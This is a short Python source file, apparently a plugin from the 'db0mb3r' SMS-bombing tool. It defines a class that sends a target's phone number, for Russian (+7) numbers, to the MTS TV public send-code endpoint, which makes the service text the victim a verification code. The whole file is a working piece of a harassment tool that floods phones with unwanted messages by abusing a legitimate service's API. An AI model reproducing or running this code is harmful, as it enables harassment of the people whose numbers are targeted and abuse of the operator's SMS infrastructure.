from db0mb3r.services.service import Service


class MTSTv(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
            params={"msisdn": self.formatted_phone},
        )
